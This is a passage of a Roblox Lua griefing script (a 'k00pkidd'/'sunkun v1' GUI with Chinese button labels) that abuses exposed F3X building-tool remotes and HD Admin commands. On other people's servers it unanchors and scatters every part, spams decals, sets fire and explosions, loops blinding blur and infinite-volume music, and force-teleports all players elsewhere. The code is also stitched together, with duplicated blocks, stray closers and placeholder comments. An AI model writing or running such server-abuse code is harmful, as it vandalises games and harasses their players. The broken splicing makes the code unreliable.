    RequestCommand:InvokeServer(";createteam o U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam black U00LCkidd realm")
    RequestCommand:InvokeServer(";createteam white U00LCkidd realm")



--sthing.Pos=-49.479, 9, 6.263
--sthing.Size=10, 19, 1
--sthing2.Size=50, 1, 1
--sthing2.Pos=-51.479, 8, 6.263
--sthing3.Pos=-62.979, 9, 6.263
--sthing3.Size=1, 19, 1
--sthing4.Size=51, 5, 1
--sthing4.Pos=-49.979, 16, 6.263
--glassNew.Pos=-49.979, 8.5, 6.613
--glassNew.Size=47, 10, 0.1
--wallGlass.Size=56, 4, 1
--wallGlass.Pos=-52.479, 1.5, 6.263
--wallGlass2.Pos=-76.479, 9, 6.263
--wallGlass2.Size=6, 19, 1
--idkNEWALL.Size=43, 1, 9
--idkNEWALL.Pos=-51.979, 15.5, 10.129
--oldGlass.Pos=-43.479, 11, 6.263
--oldWallGlass.Pos=-44.479, 1.5, 6.263
--oldGlassWall2.Pos=-69.979, 9, 6.263
--holder.Pos=-76.429, 16.393, 8.886
--holder.Size=0.1, 7.4, 0.1
--holder.Rotation=-44.998, 0, 0
--holder2.Pos=-57.329, 16.393, 8.886
--holder3.Pos=-37.829, 16.393, 8.886
--SpecialDoorWall.Pos=-25.479, 11, 7.763
--SpecialDoorWall.Size=2, 23, 4
--SpecialDoorWall2.Pos=-16.479, 11, 7.763
--SpecialDoorWallTop.Pos=-20.979, 17, 7.763
--SpecialDoorWallTop.Size=11, 11, 4
--newSthing.Pos=-53.479, 13.5, 10.129
--newSthing.Size=54, 1, 9

--newPartFloor2.Size=84.7, 0.8, 95.4
--newPartFloor2.Pos=-50.369, -0.436, -27.163

--FRONT FACE ALL OF THERES
--OldWallGlass.Pos=-51.479, 8, 6.263
--OldWallGlass2.Pos=-49.479, 9, 6.263
--OldWallGlass3.Pos=-62.979, 9, 6.263
--OldWallGlass4.Pos=-52.479, 1.5, 6.263
--OldGlassWall5.Pos=-49.979, 16, 6.263

--RIGHT FACE 
Wall1.Pos=-79.979, 9, -26.237

--BACK FACE
Wall2.Pos=-47.979, 9, -58.737

--LEFT FACE
Wall3.Pos=-15.979, 9, -26.237
end)

-- 24. 全图坠落
makeBtn(scrollFrame, "FallApart", "全图坠落").MouseButton1Click:Connect(function()
    -- 解锚所有物体
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "Terrain" then
            pcall(function()
                v.Anchored = false
                runSync({"SyncAnchor", {{Part = v, Anchored = false}}})
                
                -- 添加随机力
                local bodyForce = Instance.new("BodyForce")
                bodyForce.Force = Vector3.new(
                    math.random(-10000, 10000),
                    -v:GetMass() * workspace.Gravity * 3,
                    math.random(-10000, 10000)
                )
                bodyForce.Parent = v
                game:GetService("Debris"):AddItem(bodyForce, 1)
            end)
        end
    end
    
    hdCommand(";gravity 196.2")
    hdCommand(";music 103439408444041")
    hdCommand(";volume inf")
    hdCommand(";serverMessage 全图坠落已激活!")
end)

-- 25. 标题
makeBtn(scrollFrame, "TitleAll", "k00pkidd标题").MouseButton1Click:Connect(function()
    hdCommand(";titledg all k00pkidd")
    hdCommand(";titlecolor all 0 255 0")
    hdCommand(";serverMessage k00pkidd标题已应用!")
end)

-- 26. 绿色
makeBtn(scrollFrame, "GreenGlow", "全图绿光").MouseButton1Click:Connect(function()
    -- 改变所有物体颜色
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") and v.Name ~= "Terrain" then
            pcall(function()
                runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(0, 255, 0), UnionColoring = false}}})
                runSync({"SyncMaterial", {{Part = v, Material = Enum.Material.Neon}}})
                
                -- 添加发光
                local pointLight = Instance.new("PointLight")
                pointLight.Color = Color3.fromRGB(0, 255, 0)
                pointLight.Brightness = 5
                pointLight.Range = 20
                pointLight.Parent = v
            end)
        end
    end
    
    -- 改变环境
    hdCommand(";ambient 0 100 0")
    hdCommand(";fogcolor 0 50 0")
    hdCommand(";brightness 0.8")
    hdCommand(";serverMessage 全图绿光已激活!")
end)

-- 27. 旋转所有人
makeBtn(scrollFrame, "SpinAll", "旋转所有人").MouseButton1Click:Connect(function()
    local spinActive = true
    local spinThread = coroutine.create(function()
        while spinActive do
            hdCommand(";rotate all 360")
            task.wait(0.5)
        end
    end)
    coroutine.resume(spinThread)
    
    -- 5秒后停止
    task.delay(5, function()
        spinActive = false
        hdCommand(";freeze all")
    end)
    
    hdCommand(";serverMessage 旋转所有人!")
end)

-- 28. 缩放所有人
makeBtn(scrollFrame, "SizeAll", "缩放所有人").MouseButton1Click:Connect(function()
    hdCommand(";size all 5")
    hdCommand(";serverMessage 所有人被放大!")
end)

-- 29. 飞行所有人
makeBtn(scrollFrame, "FlyAll", "飞行所有人").MouseButton1Click:Connect(function()
    hdCommand(";fly all")
    hdCommand(";walkspeed all 50")
    hdCommand(";jumppower all 100")
    hdCommand(";serverMessage 所有人获得飞行!")
end)

-- 30. 恢复
makeBtn(scrollFrame, "Restore", "恢复(西班牙文)").MouseButton1Click:Connect(function()
    RestoreAll()
end)

-- ========== 添加拖动功能 ==========
local UserInputService = game:GetService("UserInputService")
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X, 
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- 更新滚动框架大小
local function updateScrollSize()
    local buttonCount = 0
    for _, child in pairs(scrollFrame:GetChildren()) do
        if child:IsA("TextButton") then
            buttonCount = buttonCount + 1
        end
    end
    
    local rows = math.ceil(buttonCount / 3)
    local height = rows * 55 + 20
    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, height)
end

-- 延迟更新滚动框架大小
task.spawn(function()
    task.wait(0.5)
    updateScrollSize()
end)

-- 启动消息
task.spawn(function()
    task.wait(1)
    hdCommand(";serverMessage k00pkiddUI已加载!")
    hdCommand(";shp k00pkidd万岁！🤑😎")
end)

print("k00pkiddUI加载完成!")
print("k00pkidd万亿岁无敌🤑😎")
end)

makeBtn(scrollFrame, "Btools", "建筑工具").MouseButton1Click:Connect(function()
    hdCommand(";btools")
end)

makeBtn(scrollFrame, "Decal", "贴图垃圾邮件").MouseButton1Click:Connect(function()
    local function DecalSpam(id)
        for _, v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                task.spawn(function()
                    runSync({"SetLocked", {v}, false})
                    for _, face in pairs(Enum.NormalId:GetEnumItems()) do
                        runSync({"CreateTextures", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal"}}})
                        runSync({"SyncTexture", {{["Part"] = v, ["Face"] = face, ["TextureType"] = "Decal", ["Texture"] = "rbxassetid://"..id}}})
                    end
                end)
            end
        end
    end
    
    DecalSpam("90691557558028")
end)

makeBtn(scrollFrame, "Avatar", "全部R6+换装").MouseButton1Click:Connect(function()
    hdCommand(";r6 all")
    hdCommand(";Char all c0dek1")
end)

makeBtn(scrollFrame, "R6", "R6模型").MouseButton1Click:Connect(function()
    hdCommand(";r6")
end)

makeBtn(scrollFrame, "Msg", "消息1").MouseButton1Click:Connect(function()
    hdCommand(";serverMessage sunkun v1 已激活")
end)

makeBtn(scrollFrame, "Msg2", "消息2").MouseButton1Click:Connect(function()
    hdCommand(";serverMessage 我总会回来的！")
end)

makeBtn(scrollFrame, "Theme", "主题音乐").MouseButton1Click:Connect(function()
    hdCommand(";music 103409297553965")
    hdCommand(";volume Inf")
end)

makeBtn(scrollFrame, "RainToad", "下雨蟾蜍").MouseButton1Click:Connect(function()
    local function RainToads()
        local tool = getSyncTool()
        if not tool then return end
        local remote = tool.SyncAPI.ServerEndpoint
        
        local function syncCall(args)
            remote:InvokeServer(unpack(args))
        end
        
        local function Sky(id)
            local char = player.Character or player.CharacterAdded:Wait()
            local root = char:FindFirstChild("HumanoidRootPart")
            if not root then return end
            
            local cf = root.CFrame
            local pos = CFrame.new(math.floor(cf.X), math.floor(cf.Y), math.floor(cf.Z)) + Vector3.new(0, 6, 0)
            
            runSync({"CreatePart", "Normal", pos, workspace})
            task.wait(0.1)
            
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") and math.abs(v.Position.X - pos.X) < 10 and math.abs(v.Position.Z - pos.Z) < 10 then
                    runSync({"SetName", {v}, "Skybox"})
                    runSync({"CreateMeshes", {{["Part"] = v}}})
                    runSync({"SyncMesh", {{["Part"] = v, ["MeshId"] = "rbxassetid://111891702759441"}}})
                    runSync({"SyncMesh", {{["Part"] = v, ["TextureId"] = "rbxassetid://"..id}}})
                    runSync({"SyncMesh", {{["Part"] = v, ["Scale"] = Vector3.new(7200,7200,7200)}}})
                    runSync({"SetLocked", {v}, true})
                end
            end
            
            if game.Lighting:FindFirstChild("Sky") then
                game.Lighting.Sky:Destroy()
            end
        end
        
        Sky("201208408")
        
        local function createRainToads()
            while task.wait(0.3) do
                if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
                    local hrp = player.Character.HumanoidRootPart
                    local x = hrp.Position.X
                    local z = hrp.Position.Z
                    local randint = math.random(-600, 600)
                    local randint2 = math.random(-600, 600)
                    local xloc = randint + x
                    local zloc = randint2 + z
                    local cf = hrp.Position.Y + 800
                    
                    spawn(function()
                        syncCall({"CreatePart", "Normal", CFrame.new(math.floor(xloc), math.random(cf, cf + 400), math.floor(zloc)), workspace})
                        task.wait(0.1)
                        
                        for _, v in game.Workspace:GetDescendants() do
                            if v.Name == "Part" and v.Parent == workspace and math.abs(v.Position.X - math.floor(xloc)) < 1 and math.abs(v.Position.Z - math.floor(zloc)) < 1 then
                                syncCall({"SetName", {v}, "MiniToad"})
                                syncCall({"SyncAnchor", {{Part = v, Anchored = false}}})
                                syncCall({"CreateMeshes", {{Part = v}}})
                                syncCall({"SyncMesh", {{Part = v, MeshId = "rbxassetid://7234998844"}}})
                                syncCall({"SyncMesh", {{Part = v, TextureId = "rbxassetid://1009824086"}}})
                                syncCall({"SyncCollision", {{Part = v, CanCollide = false}}})
                                v.Orientation = Vector3.new(0, 0, 0)
                                local sound = Instance.new("Sound", v)
                                sound.SoundId = "rbxassetid://153752123"
                                sound.Volume = 10
                                sound.PlayOnRemove = true
                                sound:Destroy()
                            end
                        end
                    end)
                else
                    task.wait(1)
                end
            end
        end
        
        coroutine.wrap(createRainToads)()
    end
    
    RainToads()
end)

makeBtn(scrollFrame, "SkeletonSky", "骷髅天空盒").MouseButton1Click:Connect(function()
    hdCommand(";music 95156028272944")
    hdCommand(";volume inf ;pitch 0.2")
    hdCommand(";btools")
end)

makeBtn(scrollFrame, "Re", "重生").MouseButton1Click:Connect(function()
    hdCommand(";re")
end)

makeBtn(scrollFrame, "BluyRealm", "BluyXploit领域").MouseButton1Click:Connect(function()
    hdCommand(";forceplace all 95082319685218")
end)

makeBtn(scrollFrame, "Theme2", "主题2").MouseButton1Click:Connect(function()
    hdCommand(";music 1847661821")
    hdCommand(";volume inf")
end)

makeBtn(scrollFrame, "Theme3", "主题3").MouseButton1Click:Connect(function()
    hdCommand(";music 118761863682498")
    hdCommand(";volume inf")
end)

makeBtn(scrollFrame, "Brainrot", "脑洞说唱").MouseButton1Click:Connect(function()
    hdCommand(";music 85039047299073")
    hdCommand(";volume inf ;pitch 0.1")
end)

makeBtn(scrollFrame, "Stadium", "体育场狂欢").MouseButton1Click:Connect(function()
    hdCommand(";music 1846368080")
    hdCommand(";volume inf")
end)

makeBtn(scrollFrame, "Spooky", "恐怖音乐").MouseButton1Click:Connect(function()
    hdCommand(";music 95156028272944")
    hdCommand(";volume inf ;pitch 0.14")
end)

makeBtn(scrollFrame, "U00LCafe", "U00LCkidd咖啡馆").MouseButton1Click:Connect(function()
    hdCommand(";forceplace all 109147333821356")
    hdCommand(";music 103439408444041")
    task.wait(1)
    hdCommand(";time 0")
    hdCommand(";fogcolor black")
    hdCommand(";music 1846575559")
    hdCommand(";SM The u00lc's world team tour realm (coffee shop) By U00LCkidd")
end)

-- ========== 新增6个F3X+HD功能按钮 ==========
makeBtn(scrollFrame, "ColorChange", "变色(循环)").MouseButton1Click:Connect(ColorChange)

makeBtn(scrollFrame, "FullRotation", "全图旋转(循环)").MouseButton1Click:Connect(FullRotation)

makeBtn(scrollFrame, "FullExplosion", "爆炸(循环)").MouseButton1Click:Connect(FullExplosion)

makeBtn(scrollFrame, "BallRain", "下球雨(循环)").MouseButton1Click:Connect(BallRain)

makeBtn(scrollFrame, "SpawnNPCs", "NPC(循环)").MouseButton1Click:Connect(SpawnNPCs)

makeBtn(scrollFrame, "SunKunRealm", "sunkun领域").MouseButton1Click:Connect(SunkunRealm)

-- ========== 创建本地客户端区按钮 ==========
-- ...（之前的本地客户端区按钮）

-- ========== 创建新增功能区按钮 ==========
-- ...（之前的新增功能区按钮）

-- ========== 添加关闭按钮 ==========
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -45, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextScaled = true
closeBtn.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 20)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ========== 添加拖动功能 ==========
local UserInputService = game:GetService("UserInputService")
local dragging = false
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X, 
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

-- 更新滚动框架大小
local function updateScrollSize(frame)
    local buttonCount = 0
    for _, child in pairs(frame:GetChildren()) do
        if child:IsA("TextButton") then
            buttonCount = buttonCount + 1
        end
    end
    
    local rows = math.ceil(buttonCount / 3)
    local height = rows * 45 + 20
    frame.CanvasSize = UDim2.new(0, 0, 0, height)
end

-- 延迟更新滚动框架大小
task.spawn(function()
    task.wait(0.5)
    updateScrollSize(scrollFrame)
    updateScrollSize(clientScroll)
    updateScrollSize(newScroll)
end)

-- 启动消息
task.spawn(function()
    task.wait(1)
    hdCommand(";serverMessage sunkun v1 已加载！")
end)

print("sunkun v1 脚本加载完成！新增6个F3X+HD功能已添加！")
end)

makeBtn(scrollFrame, "Btools", "建筑工具").MouseButton1Click:Connect(function()
    hdCommand(";btools")
end)

-- ... 其他原有F3X功能 ...

-- ========== 新增8个F3X+HD功能 ==========

-- 1. 模糊(全玩家视野高度蓝色模糊)
local blurActive = false
local blurThread

makeBtn(newScroll, "BlurEffect", "模糊v1").MouseButton1Click:Connect(function()
    if blurActive then
        blurActive = false
        if blurThread then
            coroutine.close(blurThread)
        end
        hdCommand(";blur all 0")
        return
    end
    
    blurActive = true
    blurThread = coroutine.create(function()
        while blurActive do
            hdCommand(";blur all 50")
            hdCommand(";blurcolor all 0 0 255")
            hdCommand(";fogcolor all 0 0 150")
            hdCommand(";fogend all 100")
            task.wait(0.5)
        end
    end)
    coroutine.resume(blurThread)
end)

-- 2. 广角(全玩家视频拉长广角+全玩家视野模糊)
local wideAngleActive = false
local wideAngleThread

makeBtn(newScroll, "WideAngle", "广角v1").MouseButton1Click:Connect(function()
    if wideAngleActive then
        wideAngleActive = false
        if wideAngleThread then
            coroutine.close(wideAngleThread)
        end
        hdCommand(";fov all 70")
        hdCommand(";blur all 0")
        return
    end
    
    wideAngleActive = true
    wideAngleThread = coroutine.create(function()
        while wideAngleActive do
            hdCommand(";fov all 120")
            hdCommand(";blur all 30")
            hdCommand(";shakycam all")
            task.wait(0.3)
        end
    end)
    coroutine.resume(wideAngleThread)
end)

-- 3. 火焰(全玩家身上添加火焰+全图建筑形状方块物体等添加火焰)
local fireActive = false
local fireThread

makeBtn(newScroll, "FireEffect", "火焰v1").MouseButton1Click:Connect(function()
    if fireActive then
        fireActive = false
        if fireThread then
            coroutine.close(fireThread)
        end
        hdCommand(";removefire all")
        return
    end
    
    fireActive = true
    fireThread = coroutine.create(function()
        while fireActive do
            -- 给所有玩家添加火焰
            hdCommand(";fire all")
            
            -- 给所有建筑添加火焰
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name ~= "Terrain" then
                    pcall(function()
                        runSync({"CreateDecorations", {{["Part"] = obj, ["DecorationType"] = "Fire"}}})
                    end)
                end
            end
            
            -- 创建额外的火焰效果
            for i = 1, 20 do
                local randomPos = Vector3.new(
                    math.random(-300, 300),
                    math.random(0, 100),
                    math.random(-300, 300)
                )
                runSync({"CreatePart", "Normal", CFrame.new(randomPos), workspace})
                task.wait(0.05)
                
                for _, v in pairs(workspace:GetDescendants()) do
                    if v:IsA("BasePart") and v.Position == randomPos then
                        runSync({"SetName", {v}, "Fire_Particle"})
                        runSync({"SyncColor", {{Part = v, Color = Color3.fromRGB(255, 100, 0), UnionColoring = false}}})
                        runSync({"CreateDecorations", {{["Part"] = v, ["DecorationType"] = "Fire"}}})
                        break
                    end
                end
            end
            
            task.wait(3)
        end
    end)
    coroutine.resume(fireThread)
end)

-- 4. 形状变色(全图建筑形状方块物体模型物质等全部变色循环)
local shapeColorActive = false
local shapeColorThread

makeBtn(newScroll, "ShapeColorChange", "形状变色v1").MouseButton1Click:Connect(function()
    if shapeColorActive then
        shapeColorActive = false
        if shapeColorThread then
            coroutine.close(shapeColorThread)
        end
        return
    end
    
    shapeColorActive = true
    shapeColorThread = coroutine.create(function()
        while shapeColorActive do
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name ~= "Terrain" and obj.Name ~= "Skybox" then
                    local color = Color3.fromRGB(
                        math.random(0, 255),
                        math.random(0, 255),
                        math.random(0, 255)
                    )
                    pcall(function()
                        runSync({"SyncColor", {{Part = obj, Color = color, UnionColoring = false}}})
                        runSync({"SyncMaterial", {{Part = obj, Material = Enum.Material.Neon}}})
                    end)
                end
            end
            
            -- 使用HD管理员改变所有玩家颜色
            hdCommand(";color all " .. math.random(0,255) .. " " .. math.random(0,255) .. " " .. math.random(0,255))
            
            task.wait(0.5)
        end
    end)
    coroutine.resume(shapeColorThread)
end)

-- 5. 黑夜(时间变成黑夜，月亮(循环上下移动变色)/太阳(循环上下移动变色)/时间(加速))
local nightActive = false
local nightThread
local nightObjects = {}

makeBtn(newScroll, "NightEffect", "黑夜v1").MouseButton1Click:Connect(function()
    if nightActive then
        nightActive = false
        if nightThread then
            coroutine.close(nightThread)
        end
        
        -- 清理创建的物体
        for _, obj in pairs(nightObjects) do
            if obj and obj.Parent then
                obj:Destroy()
            end
        end
        nightObjects = {}
        
        hdCommand(";time 12")
        hdCommand(";ambient 255 255 255")
        hdCommand(";brightness 1")
        return
    end
    
    nightActive = true
    
    -- 设置夜晚环境
    hdCommand(";time 0")
    hdCommand(";brightness 0.1")
    hdCommand(";ambient 50 50 100")
    hdCommand(";fogcolor 0 0 50")
    hdCommand(";fogend 300")
    hdCommand(";music 95156028272944")
    hdCommand(";volume inf ;pitch 0.2")
    
    -- 创建月亮
    local moon = Instance.new("Part")
    moon.Name = "Night_Moon"
    moon.Size = Vector3.new(20, 20, 20)
    moon.Position = Vector3.new(0, 200, 0)
    moon.Anchored = true
    moon.CanCollide = false
    moon.Material = Enum.Material.Neon
    moon.Color = Color3.fromRGB(255, 255, 200)
    moon.Parent = workspace
    
    local moonLight = Instance.new("PointLight")
    moonLight.Color = Color3.fromRGB(255, 255, 200)
    moonLight.Brightness = 5
    moonLight.Range = 500
    moonLight.Parent = moon
    
    local moonMesh = Instance.new("SpecialMesh")
    moonMesh.MeshType = Enum.MeshType.Sphere
    moonMesh.Parent = moon
    
    table.insert(nightObjects, moon)
    
    -- 创建星星
    for i = 1, 50 do
        local star = Instance.new("Part")
        star.Name = "Night_Star"
        star.Size = Vector3.new(1, 1, 1)
        star.Position = Vector3.new(
            math.random(-500, 500),
            math.random(150, 300),
            math.random(-500, 500)
        )
        star.Anchored = true
        star.CanCollide = false
        star.Material = Enum.Material.Neon
        star.Color = Color3.fromRGB(255, 255, 255)
        star.Parent = workspace
        
        local starLight = Instance.new("PointLight")
        starLight.Color = Color3.fromRGB(255, 255, 255)
        starLight.Brightness = math.random(1, 3)
        starLight.Range = 100
        starLight.Parent = star
        
        table.insert(nightObjects, star)
    end
    
    nightThread = coroutine.create(function()
        local moonY = 200
        local moonDirection = 1
        local moonColorIndex = 0
        
        while nightActive do
            -- 月亮上下移动
            moonY = moonY + (5 * moonDirection)
            if moonY > 300 then
                moonDirection = -1
            elseif moonY < 100 then
                moonDirection = 1
            end
            moon.Position = Vector3.new(0, moonY, 0)
            
            -- 月亮变色循环
            moonColorIndex = (moonColorIndex + 1) % 360
            local hue = moonColorIndex / 360
            local color = Color3.fromHSV(hue, 0.3, 1)
            moon.Color = color
            moonLight.Color = color
            
            -- 时间加速
            game.Lighting.ClockTime = (game.Lighting.ClockTime + 0.1) % 24
            
            -- 星星闪烁
            for _, star in pairs(nightObjects) do
                if star.Name == "Night_Star" then
                    star.PointLight.Brightness = math.random(0.5, 3)
                end
            end
            
            task.wait(0.1)
        end
    end)
    coroutine.resume(nightThread)
end)

-- 6. 666(全图建筑形状方块物体模型物质等变成红色全图建筑形状方块物体模型物质等显示黑色框架边缘，全图建筑形状方块物体模型物质等生成漂浮文本"666"然后隔几秒循环提示666)
local sixSixSixActive = false
local sixSixSixThread
local sixSixSixTexts = {}

makeBtn(newScroll, "SixSixSix", "666v1").MouseButton1Click:Connect(function()
    if sixSixSixActive then
        sixSixSixActive = false
        if sixSixSixThread then
            coroutine.close(sixSixSixThread)
        end
        
        -- 清理漂浮文本
        for _, text in pairs(sixSixSixTexts) do
            if text and text.Parent then
                text:Destroy()
            end
        end
        sixSixSixTexts = {}
        
        hdCommand(";color all normal")
        return
    end
    
    sixSixSixActive = true
    
    -- 设置红色主题
    hdCommand(";color all 255 0 0")
    hdCommand(";fogcolor 100 0 0")
    hdCommand(";ambient 255 100 100")
    hdCommand(";music 103409297553965")
    hdCommand(";volume inf")
    
    -- 创建漂浮文本
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name ~= "Terrain" then
            -- 添加黑色框架边缘
            pcall(function()
                runSync({"SyncColor", {{Part = obj, Color = Color3.fromRGB(255, 0, 0), UnionColoring = false}}})
                runSync({"SyncMaterial", {{Part = obj, Material = Enum.Material.Neon}}})
            end)
            
            -- 创建漂浮文本
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "SixSixSix_Text"
            billboard.Size = UDim2.new(0, 100, 0, 30)
            billboard.AlwaysOnTop = true
            billboard.StudsOffset = Vector3.new(0, 5, 0)
            billboard.Parent = obj
            
            local textLabel = Instance.new("TextLabel")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = "666"
            textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
            textLabel.TextScaled = true
            textLabel.Font = Enum.Font.GothamBlack
            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            textLabel.TextStrokeTransparency = 0
            textLabel.Parent = billboard
            
            table.insert(sixSixSixTexts, billboard)
        end
    end
    
    sixSixSixThread = coroutine.create(function()
        while sixSixSixActive do
            -- 每隔几秒提示666
            hdCommand(";serverhint 666! 666! 666!")
            hdCommand(";serverMessage 666 邪恶降临！")
            
            -- 让文本闪烁
            for _, text in pairs(sixSixSixTexts) do
                if text and text.Parent then
                    text.TextLabel.TextColor3 = Color3.fromRGB(
                        math.random(200, 255),
                        0,
                        0
                    )
                end
            end
            
            -- 随机爆炸效果
            for i = 1, 5 do
                local randomPos = Vector3.new(
                    math.random(-200, 200),
                    math.random(0, 50),
                    math.random(-200, 200)
                )
                local explosion = Instance.new("Explosion")
                explosion.Position = randomPos
                explosion.BlastPressure = 500000
                explosion.BlastRadius = 10
                explosion.Parent = workspace
            end
            
            task.wait(3)
        end
    end)
    coroutine.resume(sixSixSixThread)
end)

-- 7. 坠落(全图建筑形状方块物体模型物质等散架往下坠落/掉落)
local fallActive = false
local fallThread
local originalPositions = {}

makeBtn(newScroll, "FallApart", "坠落v1").MouseButton1Click:Connect(function()
    if fallActive then
        fallActive = false
        if fallThread then
            coroutine.close(fallThread)
        end
        
        -- 恢复原始位置
        for part, data in pairs(originalPositions) do
            if part and part.Parent then
                pcall(function()
                    part.Anchored = data.anchored
                    part.CFrame = data.cframe
                end)
            end
        end
        originalPositions = {}
        return
    end
    
    fallActive = true
    
    -- 保存原始位置并解锚
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and obj.Name ~= "Terrain" then
            originalPositions[obj] = {
                cframe = obj.CFrame,
                anchored = obj.Anchored
            }
            pcall(function()
                obj.Anchored = false
                runSync({"SyncAnchor", {{Part = obj, Anchored = false}}})
            end)
        end
    end
    
    fallThread = coroutine.create(function()
        while fallActive do
            -- 添加随机力使物体散落
            for obj, _ in pairs(originalPositions) do
                if obj and obj.Parent then
                    local bodyForce = Instance.new("BodyForce")
                    bodyForce.Force = Vector3.new(
                        math.random(-10000, 10000),
                        math.random(-50000, -20000),
                        math.random(-10000, 10000)
                    )
                    bodyForce.Parent = obj
                    
                    game:GetService("Debris"):AddItem(bodyForce, 0.1)
                end
            end
            
            -- 创建坠落粒子效果
            for i = 1, 10 do
                local particle = Instance.new("Part")
                particle.Size = Vector3.new(1, 1, 1)
                particle.Position = Vector3.new(
                    math.random(-300, 300),
                    math.random(100, 200),
                    math.random(-300, 300)
                )
                particle.Anchored = false
                particle.CanCollide = false
                particle.Color = Color3.fromRGB(100, 100, 100)
                particle.Material = Enum.Material.Concrete
                particle.Parent = workspace
                
                local bodyForce = Instance.new("BodyForce")
                bodyForce.Force = Vector3.new(0, -particle:GetMass() * workspace.Gravity * 2, 0)
                bodyForce.Parent = particle
                
                game:GetService("Debris"):AddItem(particle, 5)
            end
            
            task.wait(1)
        end
    end)
    coroutine.resume(fallThread)
    
    -- 使用HD管理员命令增强效果
    hdCommand(";gravity 196.2")
    hdCommand(";music 103439408444041")
    hdCommand(";volume inf")
end)

-- 8. 附加功能：全图旋转+变色组合
local comboActive = false
local comboThread

makeBtn(newScroll, "ComboEffect", "旋转变色v1").MouseButton1Click:Connect(function()
    if comboActive then
        comboActive = false
        if comboThread then
            coroutine.close(comboThread)
        end
        hdCommand(";freeze all")
        hdCommand(";color all normal")
        return
    end
    
    comboActive = true
    comboThread = coroutine.create(function()
        local colorIndex = 0
        while comboActive do
            -- 旋转
            hdCommand(";rotate all 360")
            
            -- 变色
            colorIndex = (colorIndex + 1) % 6
            local colors = {
                {255, 0, 0},
                {0, 255, 0},
                {0, 0, 255},
                {255, 255, 0},
                {255, 0, 255},
                {0, 255, 255}
            }
            local color = colors[colorIndex + 1]
            hdCommand(";color all " .. color[1] .. " " .. color[2] .. " " .. color[3])
            
            task.wait(0.5)
        end
    end)
    coroutine.resume(comboThread)
end)

-- ========== 标签页切换功能 ==========
tabF3X.MouseButton1Click:Connect(function()
    scrollFrame.Visible = true
    clientScroll.Visible = false
    newScroll.Visible = false
    teamScroll.Visible = false
end)

tabClient.MouseButton1Click:Connect(function()
    scrollFrame.Visible = false
    clientScroll.Visible = true
    newScroll.Visible = false
    teamScroll.Visible = false
end)

tabNew.MouseButton1Click:Connect(function()
    scrollFrame.Visible = false
    clientScroll.Visible = false
    newScroll.Visible = true
    teamScroll.Visible = false
end)

tabTeam.MouseButton1Click:Connect(function()
    scrollFrame.Visible = false
    clientScroll.Visible = false
    newScroll.Visible = false
    teamScroll.Visible = true
end)

-- ========== 添加关闭按钮 ==========
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -45, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextScaled = true
closeBtn.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 20)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- ========== 添加拖动功能 ==========
local UserInputService = game:GetService("UserInputService")
